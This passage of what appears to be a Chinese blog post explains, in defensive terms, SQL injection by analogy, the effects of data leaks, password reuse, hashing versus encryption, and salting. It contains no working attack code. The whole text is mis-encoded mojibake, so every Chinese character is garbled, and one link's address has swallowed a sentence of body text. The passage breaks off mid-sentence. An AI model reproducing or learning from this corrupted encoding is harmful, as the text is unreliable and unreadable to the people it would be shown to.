SQL æ˜¯ä»€éº¼ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯è·Ÿè³‡æ–™åº«æŸ¥è©¢æ±è¥¿çš„ä¸€ç¨®ç¨‹å¼èªè¨€ã€‚æ—¢ç„¶èªªæ˜¯èªè¨€é‚£å°±æœƒæœ‰å›ºå®šèªæ³•ï¼Œè‹¥æ˜¯ä»¥ä¸­æ–‡èˆ‰ä¾‹ï¼Œå¤§æ¦‚å°±åƒæ˜¯ï¼š</p>\n<blockquote>\n<p>å»æ‰¾ã€Œè¨‚å–®è³‡æ–™ã€ï¼Œçµ¦æˆ‘ã€Œid æ˜¯ 1 çš„ã€ï¼ŒæŒ‰ç…§ã€Œå»ºç«‹æ™‚é–“ã€æ’åº</p>\n</blockquote>\n<p>ç”¨ã€Œã€æ¡†èµ·ä¾†çš„éƒ¨åˆ†ä»£è¡¨å¯ä»¥è®Šå‹•ï¼Œè€Œå…¶ä»–é—œéµå­—ä¾‹å¦‚èªªã€Œå»æ‰¾ã€ã€ã€Œçµ¦æˆ‘ã€é€™äº›éƒ½æ˜¯å›ºå®šçš„ï¼Œå› ç‚ºèªæ³•è¦å›ºå®šæ‰èƒ½å¯«ç¨‹å¼å»è§£æã€‚</p>\n<p>åŒæ¨£ä»¥ä¸Šé¢å‡æƒ³çš„è³¼ç‰©ç¶²ç«™ç‚ºä¾‹ï¼Œå¦‚æœç¶²å€æ˜¯ <a href=\"https://shop.huli.tw/orders?id=14597%EF%BC%8C%E9%82%A3%E7%B6%B2%E7%AB%99%E5%8E%BB%E8%B7%9F%E8%B3%87%E6%96%99%E5%BA%AB%E6%8B%BF%E8%B3%87%E6%96%99%E6%99%82%EF%BC%8C%E6%8C%87%E4%BB%A4%E5%A4%A7%E6%A6%82%E5%B0%B1%E6%98%AF%EF%BC%9A\">https://shop.huli.tw/orders?id=14597ï¼Œé‚£ç¶²ç«™å»è·Ÿè³‡æ–™åº«æ‹¿è³‡æ–™æ™‚ï¼ŒæŒ‡ä»¤å¤§æ¦‚å°±æ˜¯ï¼š</a></p>\n<blockquote>\n<p>å»æ‰¾ã€Œè¨‚å–®è³‡æ–™ã€ï¼Œçµ¦æˆ‘ã€Œid æ˜¯ 14597 çš„ã€</p>\n</blockquote>\n<p>å› ç‚ºç¶²å€åˆ—ä¸Šçš„ id æ˜¯ 14597 å˜›ï¼Œæ‰€ä»¥é€™å€‹ id å°±æœƒè¢«æ”¾åˆ°æŸ¥è©¢çš„æŒ‡ä»¤å»ï¼Œå¦‚æœ id æ˜¯åˆ¥çš„ï¼Œé‚£æŸ¥è©¢çš„æŒ‡ä»¤ä¹Ÿæœƒä¸ä¸€æ¨£ã€‚</p>\n<p>é€™æ™‚å€™å¦‚æœæˆ‘çš„ id ä¸æ˜¯æ•¸å­—ï¼Œè€Œæ˜¯ã€Œ1 çš„é †ä¾¿çµ¦æˆ‘ä½¿ç”¨è€…è³‡æ–™ã€ï¼ŒæŸ¥è©¢å°±è®Šæˆï¼š</p>\n<blockquote>\n<p>å»æ‰¾ã€Œè¨‚å–®è³‡æ–™ã€ï¼Œçµ¦æˆ‘ã€Œid æ˜¯ 1 çš„é †ä¾¿çµ¦æˆ‘ä½¿ç”¨è€…è³‡æ–™ã€</p>\n</blockquote>\n<p>é‚£æ•´å€‹ç¶²ç«™çš„ä½¿ç”¨è€…è³‡æ–™å°±é †ä¾¿è¢«æˆ‘æŠ“ä¸‹ä¾†äº†ã€‚</p>\n<p>é€™å€‹æ”»æ“Šä¹‹æ‰€ä»¥å«åš SQL injectionï¼Œé‡é»å°±åœ¨æ–¼é‚£å€‹ injectionï¼Œæ”»æ“Šè€…ã€Œæ³¨å…¥ã€äº†ä¸€æ®µæ–‡å­—è¢«ç•¶ä½œæŒ‡ä»¤çš„ä¸€éƒ¨åˆ†åŸ·è¡Œï¼Œæ‰€ä»¥æ”»æ“Šè€…å°±å¯ä»¥åŸ·è¡Œä»»æ„æŸ¥è©¢ã€‚</p>\n<p>æ¯”èµ·ä¸Šé¢è¬›çš„ IDORï¼ŒSQL injection é€šå¸¸æœƒæ›´ç‚ºè‡´å‘½ï¼Œå› ç‚ºä¸åªæ˜¯è¨‚å–®è³‡æ–™æœ¬èº«ï¼Œé€£å…¶ä»–è³‡æ–™ä¹Ÿæœƒè¢«ä¸€èµ·æ’ˆå‡ºä¾†ã€‚æ‰€ä»¥é™¤äº†è¨‚å–®è³‡æ–™ï¼Œæœƒå“¡è³‡æ–™è·Ÿå•†å“è³‡æ–™éƒ½æœ‰å¯èƒ½ä¸€èµ·å¤–æ´©ã€‚</p>\n<p>é€™é‚Šä¹Ÿéš¨ä¾¿æ‰¾å…©å€‹å…¬é–‹çš„æ¡ˆä¾‹ï¼š</p>\n<ol>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2020-00276\">åŒ—ä¸€å¥³ä¸­ç¶²ç«™å­˜åœ¨SQL Injectionæ¼æ´</a></li>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00052\">æ¡ƒåœ’é«˜ä¸­ ç¶²ç«™ SQL injection</a></li>\n</ol>\n<p>è€Œé˜²ç¦¦æ–¹å¼å°±æ˜¯ä¸è¦æŠŠä½¿ç”¨è€…è¼¸å…¥çš„ã€Œ1 çš„é †ä¾¿çµ¦æˆ‘ä½¿ç”¨è€…è³‡æ–™ã€ç›´æ¥ç•¶ä½œæŒ‡ä»¤ï¼Œè€Œæ˜¯ç¶“éä¸€äº›è™•ç†ï¼Œè®“æ•´æ®µæŸ¥è©¢è®Šæˆï¼šã€Œçµ¦æˆ‘ id æ˜¯ï¼šã€1 çš„é †ä¾¿çµ¦æˆ‘ä½¿ç”¨è€…è³‡æ–™ã€çš„è³‡æ–™ã€ï¼Œé‚£å› ç‚ºæ²’æœ‰é€™å€‹ idï¼Œæ‰€ä»¥ä»€éº¼äº‹ä¹Ÿä¸æœƒç™¼ç”Ÿã€‚</p>\n<h2 id=\"%E5%80%8B%E8%B3%87%E6%B4%A9%E6%BC%8F%E4%BA%86%EF%BC%8C%E7%84%B6%E5%BE%8C%E5%91%A2%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E5%80%8B%E8%B3%87%E6%B4%A9%E6%BC%8F%E4%BA%86%EF%BC%8C%E7%84%B6%E5%BE%8C%E5%91%A2%EF%BC%9F\">#</a> å€‹è³‡æ´©æ¼äº†ï¼Œç„¶å¾Œå‘¢ï¼Ÿ</h2>\n<p>å‰é¢æˆ‘å€‘å·²ç¶“çœ‹åˆ°äº†é‡å°é‚£äº›æ²’æœ‰åšå¥½é˜²ç¦¦çš„ç¶²ç«™ï¼Œå€‹è³‡å¤–æ´©æ˜¯å¤šéº½å®¹æ˜“çš„ä¸€ä»¶äº‹æƒ…ã€‚</p>\n<p>é‚£å€‹è³‡æ´©æ¼ä¹‹å¾Œï¼Œå°ä½¿ç”¨è€…æœƒæœ‰ä»€éº¼å½±éŸ¿å‘¢ï¼Ÿ</p>\n<p>å¤§å®¶æœ€æ„ŸåŒèº«å—çš„æ‡‰è©²å°±æ˜¯è©é¨™é›»è©±å§ï¼Œä¾‹å¦‚èªªæŸäº›è²·æ›¸çš„ç¶²ç«™æˆ–æ˜¯è¨‚æˆ¿ç¶²ç«™ï¼Œæ‰“éä¾†è·Ÿä½ èªªä»€éº¼è¦åˆ†æœŸé€€æ¬¾ï¼Œç‚ºäº†åšå–ä½ çš„ä¿¡ä»»ï¼Œé€£ä½ è²·äº†å“ªæœ¬æ›¸ï¼Œè¨‚äº†å“ªå€‹æˆ¿é–“ï¼Œæˆ–æ˜¯ä½ å®¶åœ°å€è·Ÿå§“åå…¨éƒ½è¬›å¾—å‡ºä¾†ã€‚</p>\n<p>é€™äº›éƒ½æ˜¯å› ç‚ºè³‡æ–™å¤–æ´©çš„ç·£æ•…ï¼Œè©é¨™é›†åœ˜æ‰æœƒçŸ¥é“çš„é€™éº¼æ¸…æ¥šã€‚</p>\n<p>ä½†é™¤äº†é€™äº›å€‹è³‡ä»¥å¤–ï¼Œé‚„æœ‰å…©å€‹æ±è¥¿ä¹Ÿæœƒå¤–æ´©ï¼Œé‚£å°±æ˜¯ä½ çš„å¸³è™Ÿè·Ÿå¯†ç¢¼ã€‚</p>\n<p>ä¹Ÿè¨±ä½ æœƒæƒ³èªªï¼šã€Œä¸å°±å¸³è™Ÿè·Ÿå¯†ç¢¼å—ï¼Œæˆ‘å°±åœ¨é‚£å€‹ç¶²ç«™ä¸Šé¢æ”¹å¯†ç¢¼ä»¥å¾Œå†ç”¨å°±å¥½å•¦ï¼ã€</p>\n<p>äº‹æƒ…ä¹Ÿè¨±æ²’æœ‰ä½ æƒ³çš„é€™éº¼ç°¡å–®ã€‚å¦‚æœä½ æ²’æœ‰ç”¨å¯†ç¢¼ç®¡ç†è»Ÿé«”çš„è©±ï¼Œæˆ‘å¤§è†½çŒœæ¸¬ä½ æ‰€æœ‰çš„å¯†ç¢¼å¯èƒ½éƒ½æ˜¯åŒä¸€çµ„ã€‚å› ç‚ºæ€•è¨˜ä¸èµ·ä¾†å˜›ï¼Œæ‰€ä»¥ä¹¾è„†éƒ½ç”¨åŒä¸€çµ„å¯†ç¢¼ã€‚</p>\n<p>é€™æ™‚å€™å¦‚æœå¸³å¯†å¤–æ´©ï¼Œé§­å®¢æ˜¯ä¸æ˜¯å°±å¯ä»¥æ‹¿é€™çµ„å¸³å¯†å»å…¶ä»–æœå‹™è©¦è©¦çœ‹ï¼Ÿ</p>\n<p>æ‹¿å»ç™»ä½ çš„ Googleï¼Œç™»ä½ çš„ Facebookï¼Œé€™æ™‚å€™ç”¨åŒä¸€çµ„å¯†ç¢¼çš„äººå°±æœƒè¢«ç™»é€²å»ã€‚æ‰€ä»¥å¾è¡¨é¢çœ‹åªæ˜¯ä¸€å€‹è³¼ç‰©ç¶²ç«™è¢«å…¥ä¾µï¼Œä½†é€ æˆçš„çµæœå»æ˜¯ä½ çš„ Google é‚„æœ‰ Facebook ä¹Ÿä¸€èµ·è¢«ç›œäº†ã€‚</p>\n<p>æ‰€ä»¥ï¼Œæœ‰æ™‚å€™æŸå€‹ç¶²ç«™è¢«ç›œå¸³è™Ÿå¯èƒ½ä¸æ˜¯é‚£å€‹ç¶²ç«™çš„å•é¡Œï¼Œè€Œæ˜¯é§­å®¢åœ¨å…¶ä»–åœ°æ–¹æ‹¿åˆ°äº†ä½ çš„å¸³è™Ÿå¯†ç¢¼ï¼Œå°±ä¾†é€™é‚Šè©¦è©¦çœ‹ï¼Œæ²’æƒ³åˆ°å°±ä¸­äº†ã€‚</p>\n<p>å°æ–¼ç¶²ç«™çš„é–‹ç™¼è€…è€Œè¨€ï¼Œä¿è­·å¥½ä½¿ç”¨è€…çš„å€‹è³‡æ˜¯å¤©ç¶“åœ°ç¾©çš„äº‹æƒ…ï¼Œä¿è­·å¯†ç¢¼ä¹Ÿæ˜¯ï¼Œæœ‰æ²’æœ‰ä»€éº¼å¥½æ–¹æ³•å¯ä»¥ä¿è­·å¯†ç¢¼å‘¢ï¼Ÿ</p>\n<p>åŠ å¯†å—ï¼ŸæŠŠå¯†ç¢¼ç”¨æŸäº›æ¼”ç®—æ³•åŠ å¯†ï¼Œé€™æ¨£è³‡æ–™åº«å„²å­˜çš„å°±æœƒæ˜¯åŠ å¯†å¾Œçš„çµæœï¼Œå„˜ç®¡è¢«å·èµ°äº†ï¼Œé§­å®¢åªè¦æ²’æœ‰è§£å¯†çš„æ–¹æ³•å°±è§£ä¸é–‹ã€‚</p>\n<p>è½èµ·ä¾†ä¼¼ä¹æ˜¯æœ€å®‰å…¨çš„åšæ³•äº†ï¼Œä½†å…¶å¯¦é‚„æœ‰ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯ç¶²ç«™çš„é–‹ç™¼è€…é‚„æ˜¯æœƒçŸ¥é“æ€éº¼è§£å¯†ï¼Œå¦‚æœæœ‰å·¥ç¨‹å¸«ç›£å®ˆè‡ªç›œæ€éº¼è¾¦ï¼Ÿä»–é‚„æ˜¯å¯ä»¥çŸ¥é“æ¯å€‹ä½¿ç”¨è€…çš„å¯†ç¢¼æ˜¯ä»€éº¼ï¼Œå¯ä»¥æŠŠé€™äº›è³‡è¨Šæ‹¿å»è³£æˆ–è€…æ˜¯è‡ªå·±åˆ©ç”¨ã€‚</p>\n<p>å—¯â€¦ä¼¼ä¹æˆ‘å€‘ä¹Ÿä¸èƒ½æ€éº¼æ¨£ï¼Œå› ç‚ºç„¡è«–å¦‚ä½•ï¼Œé–‹ç™¼è€…éƒ½éœ€è¦æœ‰æ–¹æ³•çŸ¥é“è³‡æ–™åº«å­˜çš„å¯†ç¢¼ç©¶ç«Ÿæ˜¯å¤šå°‘å§ï¼Ÿä¸ç„¶åœ¨ç™»å…¥çš„æ™‚å€™æ€éº¼ç¢ºèªå¸³è™Ÿå¯†ç¢¼æ˜¯å°çš„ï¼Ÿ</p>\n<p>å†è€…ï¼Œé€™æ¨£è½èµ·ä¾†æ‡‰è©²å¤ å®‰å…¨äº†ï¼Œè¦æ€éº¼æ¨£æ‰èƒ½æ›´å®‰å…¨ï¼Ÿé›£é“è¦é€£ç¶²ç«™çš„é–‹ç™¼è€…éƒ½ç„¡æ³•è§£å¯†ï¼Œéƒ½ä¸çŸ¥é“å¯†ç¢¼æ˜¯ä»€éº¼æ‰å¤ å®‰å…¨å—ï¼Ÿ</p>\n<p>Bingoï¼ç­”å°äº†ï¼Œå°±æ˜¯è¦é€™æ¨£æ²’éŒ¯ï¼</p>\n<h2 id=\"%E6%B2%92%E6%9C%89%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A2%BC%EF%BC%8C%E5%8C%85%E6%8B%AC%E7%B6%B2%E7%AB%99%E6%9C%AC%E8%BA%AB\"><a class=\"direct-link\" href=\"#%E6%B2%92%E6%9C%89%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A2%BC%EF%BC%8C%E5%8C%85%E6%8B%AC%E7%B6%B2%E7%AB%99%E6%9C%AC%E8%BA%AB\">#</a> æ²’æœ‰äººçŸ¥é“ä½ çš„å¯†ç¢¼ï¼ŒåŒ…æ‹¬ç¶²ç«™æœ¬èº«</h2>\n<p>äº‹å¯¦ä¸Šï¼Œç¶²ç«™çš„è³‡æ–™åº«æ˜¯ä¸æœƒå„²å­˜ä½ çš„å¯†ç¢¼çš„ã€‚</p>\n<p>æˆ–æ›´ç²¾ç¢ºåœ°èªªï¼Œä¸æœƒå„²å­˜ä½ çš„ã€ŒåŸå§‹å¯†ç¢¼ã€ï¼Œä½†æœƒå„²å­˜å¯†ç¢¼ç¶“éæŸç¨®é‹ç®—å¾Œçš„çµæœï¼Œè€Œä¸”æœ€é‡è¦çš„æ˜¯ï¼Œé€™å€‹é‹ç®—æ˜¯ç„¡æ³•é‚„åŸçš„ã€‚</p>\n<p>ç›´æ¥èˆ‰ä¾‹æ¯”è¼ƒå¿«ï¼Œå‡è¨­ä»Šå¤©æœ‰å€‹å¾ˆç°¡å–®çš„æ¼”ç®—æ³•ï¼Œå¯ä»¥æŠŠå¯†ç¢¼åšè½‰æ›ï¼Œè½‰æ›æ–¹å¼æ˜¯ï¼šã€Œæ•¸å­—ä¸åšè½‰æ›ï¼Œè‹±æ–‡å­—æ¯æŠŠ a æ›æˆ 1ï¼Œb æ›æˆ 2â€¦z æ›æˆ 26ã€ï¼Œä»¥æ­¤é¡æ¨ï¼Œç¬¬å¹¾å€‹å­—æ¯å°±æ›æˆå¹¾ï¼Œå¤§å°å¯«ä¸åˆ†éƒ½ä¸€æ¨£ï¼ˆå…ˆå‡è¨­ä¸æœƒæœ‰ç¬¦è™Ÿï¼‰ã€‚</p>\n<p>å¦‚æœå¯†ç¢¼æ˜¯ abc123ï¼Œè½‰æ›å®Œå°±è®Šæˆ 123123ã€‚</p>\n<p>åœ¨ä½¿ç”¨è€…è¨»å†Šçš„æ™‚å€™ï¼Œç¶²ç«™å°±æŠŠä½¿ç”¨è€…è¼¸å…¥çš„ abc123 è½‰æˆ 123123ï¼Œç„¶å¾Œå­˜åˆ°è³‡æ–™åº«è£¡é¢ã€‚å› æ­¤è³‡æ–™åº«å­˜çš„å¯†ç¢¼æ˜¯ 123123ï¼Œè€Œä¸æ˜¯ abc123ã€‚</p>\n<p>ç•¶ä½¿ç”¨è€…ç™»å…¥æ™‚ï¼Œæˆ‘å€‘å°±å†æŠŠè¼¸å…¥çš„å€¼ç”¨åŒæ¨£çš„é‚è¼¯è½‰æ›ï¼Œå¦‚æœè¼¸å…¥ä¸€æ¨£ï¼Œè½‰æ›å¾Œçš„çµæœå°±æœƒä¸€æ¨£å°å§ï¼Ÿå°±çŸ¥é“å¯†ç¢¼æ˜¯ä¸æ˜¯æ­£ç¢ºçš„ã€‚</p>\n<p>ç•¶é§­å®¢æŠŠè³‡æ–™åº«å·èµ°ä»¥å¾Œï¼Œæœƒæ‹¿åˆ° 123123 é€™çµ„å¯†ç¢¼ï¼Œé‚£ä¸€æ¨£å•Šï¼Œä¸æ˜¯å¯ä»¥æ¨è«–å‡ºåŸæœ¬æ˜¯ abc123 å—ï¼Ÿä¸ä¸ä¸ï¼Œæ²’é€™éº¼ç°¡å–®ã€‚</p>\n<p>123123ã€abcabcã€12cab3â€¦é€™äº›å¯†ç¢¼è½‰æ›ä¹‹å¾Œï¼Œä¸ä¹Ÿæ˜¯ 123123 å—ï¼Ÿæ‰€ä»¥å„˜ç®¡çŸ¥é“è½‰æ›è¦å‰‡è·Ÿçµæœï¼Œå»æ²’æœ‰è¾¦æ³•é‚„åŸæˆã€Œå”¯ä¸€ä¸€çµ„å¯†ç¢¼ã€ï¼Œé€™å°±æ˜¯é€™å€‹æ¼”ç®—æ³•å²å®³çš„åœ°æ–¹ï¼</p>\n<p>é€™æ¨£çš„è½‰æ›å°±å«åšé›œæ¹Šï¼ˆHashï¼‰ï¼Œabc123 æ¯æ¬¡ hash éå¾Œçš„çµæœéƒ½æœƒæ˜¯ 123123ï¼Œä½†æ˜¯å¾ 123123 å»ç„¡æ³•æ¨å›è¼¸å…¥ä¸€å®šæ˜¯ abc123ï¼Œå› ç‚ºæœ‰å…¶ä»–ç¨®å¯èƒ½æ€§å­˜åœ¨ã€‚</p>\n<p>é€™å°±æ˜¯ hash è·ŸåŠ å¯†æœ€å¤§çš„ä¸åŒã€‚</p>\n<p>åŠ å¯†è·Ÿè§£å¯†æ˜¯æˆå°çš„ï¼Œå¦‚æœå¯ä»¥åŠ å¯†å°±ä¸€å®šå¯ä»¥è§£å¯†ï¼Œæ‰€ä»¥ä½ çŸ¥é“å¯†æ–‡è·Ÿå¯†é‘°ï¼Œå°±å¯ä»¥çŸ¥é“æ˜æ–‡ã€‚ä½† hash ä¸åŒï¼Œä½ çŸ¥é“ hash çš„æ¼”ç®—æ³•è·Ÿçµæœï¼Œå»ç„¡æ³•å›æ¨å‡ºåŸæœ¬çš„è¼¸å…¥æ˜¯ä»€éº¼ã€‚</p>\n<p>è€Œé€™å€‹æ©Ÿåˆ¶æœ€å¸¸è¦‹çš„æ‡‰ç”¨ä¹‹ä¸€ï¼Œå°±åœ¨æ–¼å¯†ç¢¼çš„å„²å­˜ã€‚</p>\n<p>åœ¨è¨»å†Šæ™‚æŠŠ hash éå¾Œçš„å¯†ç¢¼å­˜é€²è³‡æ–™åº«ï¼Œç™»å…¥æ™‚æŠŠè¼¸å…¥çš„å¯†ç¢¼ hash éå¾Œè·Ÿè³‡æ–™åº«æ¯”å°ï¼Œå°±çŸ¥é“å¯†ç¢¼æ˜¯å¦æ­£ç¢ºã€‚å°±ç®—è³‡æ–™åº«è¢«å·ï¼Œé§­å®¢ä¹Ÿä¸çŸ¥é“ä½¿ç”¨è€…çš„å¯†ç¢¼æ˜¯ä»€éº¼ï¼Œå› ç‚ºå›æ¨ä¸å‡ºä¾†ã€‚</p>\n<p>é€™å°±æ˜¯ç‚ºä»€éº¼å¿˜è¨˜å¯†ç¢¼çš„æ™‚å€™ï¼Œç¶²ç«™ä¸æœƒè·Ÿä½ è¬›åŸæœ¬çš„å¯†ç¢¼æ˜¯ä»€éº¼ï¼Œå› ç‚ºç¶²ç«™æœ¬èº«ä¹Ÿä¸çŸ¥é“å•Šï¼</p>\n<p>æ‰€ä»¥ä¸èƒ½ã€Œæ‰¾å›å¯†ç¢¼ã€ï¼Œåªèƒ½ã€Œé‡è¨­å¯†ç¢¼ã€ï¼Œå› ç‚ºé‡è¨­å°±ä»£è¡¨ä½ è¼¸å…¥æ–°çš„å¯†ç¢¼ï¼Œç„¶å¾Œç¶²ç«™æŠŠæ–°çš„å¯†ç¢¼ hash ä¹‹å¾Œå­˜é€²è³‡æ–™åº«ï¼Œæœªä¾†ç™»å…¥æ™‚å°±æœƒç”¨é€™çµ„æ–°çš„ hash å»æ¯”å°ã€‚</p>\n<p>æœ‰äº›äººå¯èƒ½æœƒæ³¨æ„åˆ°é€™æ¨£çš„å„²å­˜æ–¹å¼ä¼¼ä¹æœ‰å€‹æ¼æ´ï¼Œå»¶çºŒå‰é¢çš„ä¾‹å­ï¼Œè³‡æ–™åº«å­˜çš„æ˜¯ 123123 è€Œæˆ‘çš„åŸå§‹å¯†ç¢¼æ˜¯ abc123ï¼Œé€™æ¨£å¦‚æœç”¨ã€Œabcabcã€ï¼Œhash éå¾Œä¹Ÿæ˜¯ 123123ï¼Œä¸å°±ä¹Ÿå¯ä»¥ç™»å…¥å—ï¼Ÿé€™æ¨£ä¸å¤ªå°å§ï¼Œé€™ä¸æ˜¯æˆ‘çš„å¯†ç¢¼æ¬¸</p>\n<p>æœ‰å…©å€‹ä¸åŒçš„è¼¸å…¥å»ç”¢ç”Ÿå‡ºåŒä¸€çµ„è¼¸å‡ºï¼Œé€™ç¨®ç‹€æ³ç¨±ç‚ºç¢°æ’ï¼ˆhash collisionï¼‰ï¼Œç¢°æ’ä¸€å®šæœƒç™¼ç”Ÿï¼Œä½†å¦‚æœæ¼”ç®—æ³•è¨­è¨ˆçš„å¥½ï¼Œç¢°æ’çš„æ©Ÿç‡å°±è¶…ç´šç„¡æ•µå°ï¼Œå°åˆ°å¹¾ä¹å¯ä»¥å¿½ç•¥ã€‚</p>\n<p>å‰é¢æçš„è½‰æ›è¦å‰‡åªæ˜¯ç‚ºäº†æ–¹ä¾¿èˆ‰ä¾‹ï¼ŒçœŸå¯¦ä¸–ç•Œä¸­ç”¨çš„æ¼”ç®—æ³•è¤‡é›œè¨±å¤šï¼Œå°±ç®—åªæœ‰ä¸€å€‹å­—ä¸åŒï¼Œçµæœéƒ½æœƒå¤©å·®åœ°é ï¼Œä»¥ SHA256 é€™å€‹æ¼”ç®—æ³•ç‚ºä¾‹ï¼š</p>\n<ol>\n<li>abc123 =&gt; 6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090</li>\n<li>abc124 =&gt; cd7011e7a6b27d44ce22a71a4cdfc2c47d5c67e335319ed7f6ae72cc03d7d63f</li>\n</ol>\n<p>é¡ä¼¼çš„è¼¸å…¥å»ç”¢ç”Ÿæˆªç„¶ä¸åŒçš„è¼¸å‡ºã€‚</p>\n<p>åƒæˆ‘å‰é¢èˆ‰ä¾‹ç”¨çš„è½‰æ›å°±æ˜¯ä¸å®‰å…¨çš„ hash æ¼”ç®—æ³•ï¼Œè¦ç›¡é‡é¿å…ä½¿ç”¨æˆ–æ˜¯é¿å…è‡ªå·±è¨­è¨ˆï¼Œç›¡å¯èƒ½ä½¿ç”¨å¯†ç¢¼å­¸å®¶è·Ÿå°ˆå®¶è¨­è¨ˆå‡ºçš„æ¼”ç®—æ³•ï¼Œåƒæ˜¯ä¸Šé¢æåˆ°çš„ SHA256ã€‚</p>\n<p>åœ¨ä½¿ç”¨é€™äº›æ¼”ç®—æ³•çš„æ™‚å€™ï¼Œä¹Ÿè¦ç‰¹åˆ¥æ³¨æ„ä¸€ä¸‹æ˜¯å¦å®‰å…¨ï¼Œå› ç‚ºæœ‰äº›æ¼”ç®—æ³•é›–ç„¶ä¹Ÿæ˜¯ç”±å°ˆå®¶è¨­è¨ˆï¼Œä½†å·²ç¶“è¢«è­‰æ˜æ˜¯ä¸å®‰å…¨çš„ï¼Œä¾‹å¦‚èªªå¯†ç¢¼ç”¨ MD5 ä¾† hash å¾Œå„²å­˜å°±æ˜¯ä¸å®‰å…¨çš„ï¼Œå¯ä»¥åƒè€ƒï¼š<a href=\"https://security.stackexchange.com/questions/19906/is-md5-considered-insecure\">Is MD5 considered insecure?</a></p>\n<h2 id=\"%E6%89%80%E4%BB%A5%EF%BC%8C%E5%84%B2%E5%AD%98-hash-%E5%BE%8C%E7%9A%84%E5%80%BC%E5%B0%B1%E6%B2%92%E4%BA%8B%E4%BA%86%E5%97%8E%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E6%89%80%E4%BB%A5%EF%BC%8C%E5%84%B2%E5%AD%98-hash-%E5%BE%8C%E7%9A%84%E5%80%BC%E5%B0%B1%E6%B2%92%E4%BA%8B%E4%BA%86%E5%97%8E%EF%BC%9F\">#</a> æ‰€ä»¥ï¼Œå„²å­˜ hash å¾Œçš„å€¼å°±æ²’äº‹äº†å—ï¼Ÿ</h2>\n<p>æŠ±æ­‰ï¼Œå…¶å¯¦åªå„²å­˜å¯†ç¢¼ hash éå¾Œçš„å€¼æ˜¯ä¸å¤ çš„ã€‚</p>\n<p>å’¦ï¼Œç‚ºä»€éº¼ï¼Ÿæˆ‘å‰›å‰›ä¸æ˜¯èªªæ²’è¾¦æ³•åæ¨å‡ºçµæœå—ï¼Œé‚£ç‚ºä»€éº¼ä¸å¤ ï¼Ÿ</p>\n<p>é›–ç„¶èªªæ²’è¾¦æ³•åæ¨å‡ºçµæœï¼Œä½†æ”»æ“Šè€…å¯ä»¥åˆ©ç”¨ã€Œè¼¸å…¥ä¸€æ¨£ï¼Œè¼¸å‡ºä¸€å®šä¸€æ¨£ã€çš„ç‰¹æ€§ï¼Œå…ˆå»ºå¥½ä¸€å€‹è³‡æ–™åº«ã€‚</p>\n<p>èˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­æœ‰å€‹å¾ˆå¸¸è¦‹çš„å¯†ç¢¼ abc123ï¼Œhash éå¾Œçš„å€¼æ˜¯ 6ca13dï¼Œé‚£æ”»æ“Šè€…å°±å¯ä»¥å…ˆç®—å¥½ï¼Œç„¶å¾ŒæŠŠé€™å€‹é—œä¿‚å­˜åœ¨è³‡æ–™åº«ï¼Œæ‰€ä»¥æ”»æ“Šè€…çš„è³‡æ–™åº«è£¡é¢å°±å¯èƒ½æœƒæœ‰ä¸€ç™¾è¬çµ„æœ€å¸¸è¦‹å¯†ç¢¼çš„æ¸…å–®ï¼Œè£¡é¢æœ‰è‘—æ¯å€‹å¯†ç¢¼è·Ÿå®ƒ hash éå¾Œçš„å€¼ã€‚</p>\n<p>é‚£æ¥ä¸‹ä¾†åªè¦åœ¨ hash éå¾Œçš„è³‡æ–™åº«ç™¼ç¾ 6ca13dï¼Œæ”»æ“Šè€…å°±å¯ä»¥é€éæŸ¥è¡¨çš„æ–¹å¼ï¼ŒæŸ¥å‡ºåŸæœ¬çš„å¯†ç¢¼æ˜¯ abc123ã€‚é€™ä¸æ˜¯åˆ©ç”¨æ¼”ç®—æ³•åæ¨çµæœï¼Œé€™åªæ˜¯åˆ©ç”¨ç¾æœ‰è³‡æ–™ä¾†æŸ¥è©¢è€Œå·²ã€‚</p>\n<p>ç‚ºäº†é˜²ç¦¦é€™ç¨®æ”»æ“Šï¼Œé‚„è¦åšä¸€ä»¶äº‹æƒ…å«åšåŠ é¹½ï¼ˆSaltingï¼‰ï¼Œæ²’éŒ¯ï¼Œå°±æ˜¯é¹½å·´çš„é‚£å€‹é¹½ã€‚é€šå¸¸æœƒå¹«æ¯å€‹ä½¿ç”¨è€…ç”¢ç”Ÿä¸€å€‹ç¨ä¸€ç„¡äºŒçš„é¹½å·´ï¼Œä¾‹å¦‚èªª 5ab3odï¼ˆå¯¦éš›ä¸Šæœƒæ›´é•·ï¼Œå¯èƒ½ 16 æˆ– 32 å€‹å­—ä»¥ä¸Šï¼‰ï¼Œæ¥è‘—æŠŠæˆ‘çš„å¯†ç¢¼ abc123 åŠ ä¸Šæˆ‘çš„é¹½å·´ï¼Œè®Šæˆ abc1235ab3odï¼Œç„¶å¾Œç”¨é€™å€‹åŠ é¹½éå¾Œçš„çµæœå»åš hashã€‚</p>\n<p>ç‚ºä»€éº¼è¦é€™æ¨£åšå‘¢ï¼Ÿ</p>\n<p>å› ç‚ºæ”»æ“Šè€…é å…ˆæº–å‚™å¥½çš„è¡¨æ ¼ä¸­ï¼Œæ¯”èµ· abc123ï¼Œå‡ºç¾ abc1235ab3od çš„æ©Ÿç‡é¡¯ç„¶æ›´ä½ï¼ŒåŒæ™‚åˆå› ç‚ºé•·åº¦è®Šé•·äº†ï¼Œæš´åŠ›ç ´è§£çš„é›£åº¦è®Šå¾—æ›´é«˜ã€‚å¦‚æ­¤ä¸€ä¾†ï¼Œå¯†ç¢¼å°±è®Šå¾—æ›´é›£ç ´è§£äº†ã€‚</p>\n<p>æ›´å¤šè³‡è¨Šè«‹åƒè€ƒï¼š<a href=\"https://www.ithome.com.tw/voice/127918\">ä¸æ˜¯ç¥•å¯†çš„ç¥•å¯†</a></p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> çµèª</h2>\n<p>å¿˜è¨˜å¯†ç¢¼æ™‚ç¶²ç«™ä¸æœƒæŠŠå¯†ç¢¼å¯„çµ¦æˆ‘ï¼Œå› 